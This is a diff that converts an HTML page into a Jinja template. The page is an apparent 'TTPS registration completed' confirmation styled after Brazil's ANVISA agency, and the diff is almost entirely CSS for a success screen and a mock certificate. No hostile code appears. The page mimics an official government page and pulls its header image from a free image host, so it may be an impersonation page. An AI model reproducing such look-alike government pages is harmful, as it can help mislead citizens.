@@ -1,362 +1,353 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Registro TTPS Concluído | ANVISA</title>
-  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f8f9fa;
-    }
-    
-    .main-title {
-      font-size: 24px;
-      font-weight: 700;
-      color: #1351b4;
-      margin-bottom: 8px;
-    }
-    
-    .subtitle {
-      font-size: 16px;
-      color: #666666;
-      margin-bottom: 24px;
-    }
-    
-    .sticky-header {
-      position: sticky;
-      top: 0;
-      background-color: white;
-      z-index: 50;
-      transition: box-shadow 0.3s ease;
-    }
-    
-    .sticky-header.shadow {
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    
-    .secure-badge {
-      display: inline-flex;
-      align-items: center;
-      background-color: #f0f7ff;
-      color: #1351b4;
-      padding: 6px 12px;
-      border-radius: 16px;
-      font-size: 12px;
-      font-weight: 600;
-    }
-    
-    .secure-badge i {
-      margin-right: 4px;
-    }
-    
-    .success-container {
-      background-color: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-      overflow: hidden;
-      max-width: 700px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    
-    .success-header {
-      background-color: #dcfce7;
-      padding: 20px;
-      border-bottom: 1px solid #bbf7d0;
-    }
-    
-    .success-content {
-      padding: 40px 30px;
-    }
-    
-    .success-icon {
-      width: 80px;
-      height: 80px;
-      background-color: #dcfce7;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 24px;
-    }
-    
-    .success-icon i {
-      font-size: 40px;
-      color: #16a34a;
-    }
-    
-    .success-title {
-      font-size: 24px;
-      font-weight: 700;
-      color: #16a34a;
-      margin-bottom: 12px;
-    }
-    
-    .success-subtitle {
-      font-size: 16px;
-      color: #4b5563;
-      margin-bottom: 24px;
-    }
-    
-    .registration-details {
-      background-color: #f9fafb;
-      border-radius: 8px;
-      padding: 20px;
-      margin-bottom: 24px;
-      border: 1px solid #e5e7eb;
-      text-align: left;
-    }
-    
-    .registration-title {
-      font-size: 16px;
-      font-weight: 600;
-      color: #1351b4;
-      margin-bottom: 12px;
-    }
-    
-    .registration-row {
-      display: flex;
-      margin-bottom: 8px;
-    }
-    
-    .registration-label {
-      width: 40%;
-      font-size: 14px;
-      color: #6b7280;
-    }
-    
-    .registration-value {
-      width: 60%;
-      font-size: 14px;
-      font-weight: 500;
-      color: #4b5563;
-    }
-    
-    .info-box {
-      background-color: #eff6ff;
-      border-radius: 8px;
-      padding: 16px;
-      margin-bottom: 24px;
-      border: 1px solid #bfdbfe;
-      border-left: 4px solid #3b82f6;
-      text-align: left;
-    }
-    
-    .info-title {
-      font-size: 16px;
-      font-weight: 600;
-      color: #1351b4;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-    }
-    
-    .info-title i {
-      margin-right: 8px;
-      color: #3b82f6;
-    }
-    
-    .info-text {
-      font-size: 14px;
-      color: #4b5563;
-      line-height: 1.5;
-    }
-    
-    .next-steps {
-      margin-top: 24px;
-      padding-top: 24px;
-      border-top: 1px solid #e5e7eb;
-    }
-    
-    .next-steps-title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #1351b4;
-      margin-bottom: 16px;
-    }
-    
-    .steps-list {
-      text-align: left;
-      margin-bottom: 24px;
-    }
-    
-    .step-item {
-      display: flex;
-      margin-bottom: 16px;
-    }
-    
-    .step-number {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background-color: #1351b4;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      font-weight: 600;
-      margin-right: 12px;
-      flex-shrink: 0;
-    }
-    
-    .step-content {
-      font-size: 14px;
-      color: #4b5563;
-    }
-    
-    .step-content h4 {
-      font-size: 16px;
-      font-weight: 600;
-      color: #1f2937;
-      margin-bottom: 4px;
-    }
-    
-    .btn {
-      padding: 12px 20px;
-      border-radius: 6px;
-      font-weight: 600;
-      font-size: 16px;
-      transition: all 0.2s ease;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-    }
-    
-    .btn-primary {
-      background-color: #1351b4;
-      color: white;
-      border: none;
-    }
-    
-    .btn-primary:hover {
-      background-color: #0c3d8a;
-    }
-    
-    .btn i {
-      margin-right: 8px;
-    }
-    
-    .vlibras-icon {
-      position: fixed;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      z-index: 1000;
-    }
-    
-    .certificate-box {
-      border: 2px dashed #bfdbfe;
-      border-radius: 8px;
-      padding: 20px;
-      margin-bottom: 24px;
-      background-color: #f8fafc;
-      position: relative;
-    }
-    
-    .certificate-stamp {
-      position: absolute;
-      bottom: 20px;
-      right: 20px;
-      width: 100px;
-      height: 100px;
-      background-image: url('https://upload.wikimedia.org/wikipedia/commons/3/36/RubberStamp_DRAFT.svg');
-      background-size: contain;
-      background-repeat: no-repeat;
-      opacity: 0.6;
-      transform: rotate(-15deg);
-    }
-    
-    .certificate-header {
-      text-align: center;
-      margin-bottom: 20px;
-      border-bottom: 1px solid #e5e7eb;
-      padding-bottom: 20px;
-    }
-    
-    .certificate-title {
-      font-size: 20px;
-      font-weight: 700;
-      color: #1351b4;
-      margin-bottom: 4px;
-    }
-    
-    .certificate-subtitle {
-      font-size: 14px;
-      color: #6b7280;
-    }
-    
-    .certificate-body {
-      margin-bottom: 20px;
-    }
-    
-    .certificate-text {
-      font-size: 14px;
-      color: #4b5563;
-      line-height: 1.6;
-      margin-bottom: 16px;
-    }
-    
-    .certificate-info {
-      margin-top: 16px;
-    }
-    
-    .certificate-row {
-      display: flex;
-      margin-bottom: 8px;
-    }
-    
-    .certificate-label {
-      width: 40%;
-      font-size: 14px;
-      font-weight: 600;
-      color: #4b5563;
-    }
-    
-    .certificate-value {
-      width: 60%;
-      font-size: 14px;
-      color: #4b5563;
-    }
-    
-    .certificate-footer {
-      margin-top: 30px;
-      text-align: center;
-      font-size: 12px;
-      color: #6b7280;
-    }
-    
-    .certificate-validation {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-top: 8px;
-    }
-    
-    .certificate-qr {
-      width: 80px;
-      height: 80px;
-      background-color: #e5e7eb;
-      margin-right: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 10px;
-      color: #6b7280;
-    }
-    
-    .certificate-code {
-      font-family: monospace;
-      font-size: 12px;
-      color: #4b5563;
-    }
-  </style>
-</head>
-<body>
+{% extends "base.html" %}
+
+{% block title %}Registro TTPS Concluído | ANVISA{% endblock %}
+
+{% block additional_styles %}
+.main-title {
+  font-size: 24px;
+  font-weight: 700;
+  color: #1351b4;
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #666666;
+  margin-bottom: 24px;
+}
+
+.sticky-header {
+  position: sticky;
+  top: 0;
+  background-color: white;
+  z-index: 50;
+  transition: box-shadow 0.3s ease;
+}
+
+.sticky-header.shadow {
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.secure-badge {
+  display: inline-flex;
+  align-items: center;
+  background-color: #f0f7ff;
+  color: #1351b4;
+  padding: 6px 12px;
+  border-radius: 16px;
+  font-size: 12px;
+  font-weight: 600;
+}
+
+.secure-badge i {
+  margin-right: 4px;
+}
+
+.success-container {
+  background-color: white;
+  border-radius: 12px;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+  overflow: hidden;
+  max-width: 700px;
+  margin: 0 auto;
+  text-align: center;
+}
+
+.success-header {
+  background-color: #dcfce7;
+  padding: 20px;
+  border-bottom: 1px solid #bbf7d0;
+}
+
+.success-content {
+  padding: 40px 30px;
+}
+
+.success-icon {
+  width: 80px;
+  height: 80px;
+  background-color: #dcfce7;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 24px;
+}
+
+.success-icon i {
+  font-size: 40px;
+  color: #16a34a;
+}
+
+.success-title {
+  font-size: 24px;
+  font-weight: 700;
+  color: #16a34a;
+  margin-bottom: 12px;
+}
+
+.success-subtitle {
+  font-size: 16px;
+  color: #4b5563;
+  margin-bottom: 24px;
+}
+
+.registration-details {
+  background-color: #f9fafb;
+  border-radius: 8px;
+  padding: 20px;
+  margin-bottom: 24px;
+  border: 1px solid #e5e7eb;
+  text-align: left;
+}
+
+.registration-title {
+  font-size: 16px;
+  font-weight: 600;
+  color: #1351b4;
+  margin-bottom: 12px;
+}
+
+.registration-row {
+  display: flex;
+  margin-bottom: 8px;
+}
+
+.registration-label {
+  width: 40%;
+  font-size: 14px;
+  color: #6b7280;
+}
+
+.registration-value {
+  width: 60%;
+  font-size: 14px;
+  font-weight: 500;
+  color: #4b5563;
+}
+
+.info-box {
+  background-color: #eff6ff;
+  border-radius: 8px;
+  padding: 16px;
+  margin-bottom: 24px;
+  border: 1px solid #bfdbfe;
+  border-left: 4px solid #3b82f6;
+  text-align: left;
+}
+
+.info-title {
+  font-size: 16px;
+  font-weight: 600;
+  color: #1351b4;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+}
+
+.info-title i {
+  margin-right: 8px;
+  color: #3b82f6;
+}
+
+.info-text {
+  font-size: 14px;
+  color: #4b5563;
+  line-height: 1.5;
+}
+
+.next-steps {
+  margin-top: 24px;
+  padding-top: 24px;
+  border-top: 1px solid #e5e7eb;
+}
+
+.next-steps-title {
+  font-size: 18px;
+  font-weight: 600;
+  color: #1351b4;
+  margin-bottom: 16px;
+}
+
+.steps-list {
+  text-align: left;
+  margin-bottom: 24px;
+}
+
+.step-item {
+  display: flex;
+  margin-bottom: 16px;
+}
+
+.step-number {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  background-color: #1351b4;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 12px;
+  font-weight: 600;
+  margin-right: 12px;
+  flex-shrink: 0;
+}
+
+.step-content {
+  font-size: 14px;
+  color: #4b5563;
+}
+
+.step-content h4 {
+  font-size: 16px;
+  font-weight: 600;
+  color: #1f2937;
+  margin-bottom: 4px;
+}
+
+.btn {
+  padding: 12px 20px;
+  border-radius: 6px;
+  font-weight: 600;
+  font-size: 16px;
+  transition: all 0.2s ease;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+}
+
+.btn-primary {
+  background-color: #1351b4;
+  color: white;
+  border: none;
+}
+
+.btn-primary:hover {
+  background-color: #0c3d8a;
+}
+
+.btn i {
+  margin-right: 8px;
+}
+
+.vlibras-icon {
+  position: fixed;
+  right: 10px;
+  top: 50%;
+  transform: translateY(-50%);
+  z-index: 1000;
+}
+
+.certificate-box {
+  border: 2px dashed #bfdbfe;
+  border-radius: 8px;
+  padding: 20px;
+  margin-bottom: 24px;
+  background-color: #f8fafc;
+  position: relative;
+}
+
+.certificate-stamp {
+  position: absolute;
+  bottom: 20px;
+  right: 20px;
+  width: 100px;
+  height: 100px;
+  background-image: url('https://upload.wikimedia.org/wikipedia/commons/3/36/RubberStamp_DRAFT.svg');
+  background-size: contain;
+  background-repeat: no-repeat;
+  opacity: 0.6;
+  transform: rotate(-15deg);
+}
+
+.certificate-header {
+  text-align: center;
+  margin-bottom: 20px;
+  border-bottom: 1px solid #e5e7eb;
+  padding-bottom: 20px;
+}
+
+.certificate-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #1351b4;
+  margin-bottom: 4px;
+}
+
+.certificate-subtitle {
+  font-size: 14px;
+  color: #6b7280;
+}
+
+.certificate-body {
+  margin-bottom: 20px;
+}
+
+.certificate-text {
+  font-size: 14px;
+  color: #4b5563;
+  line-height: 1.6;
+  margin-bottom: 16px;
+}
+
+.certificate-info {
+  margin-top: 16px;
+}
+
+.certificate-row {
+  display: flex;
+  margin-bottom: 8px;
+}
+
+.certificate-label {
+  width: 40%;
+  font-size: 14px;
+  font-weight: 600;
+  color: #4b5563;
+}
+
+.certificate-value {
+  width: 60%;
+  font-size: 14px;
+  color: #4b5563;
+}
+
+.certificate-footer {
+  margin-top: 30px;
+  text-align: center;
+  font-size: 12px;
+  color: #6b7280;
+}
+
+.certificate-validation {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-top: 8px;
+}
+
+.certificate-qr {
+  width: 80px;
+  height: 80px;
+  background-color: #e5e7eb;
+  margin-right: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+  color: #6b7280;
+}
+
+.certificate-code {
+  font-family: monospace;
+  font-size: 12px;
+  color: #4b5563;
+}
+{% endblock %}
+
+{% block content %}
   <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
   <div class="sticky-header">
     <div class="container mx-auto px-4 border-b border-[#0000001a]">
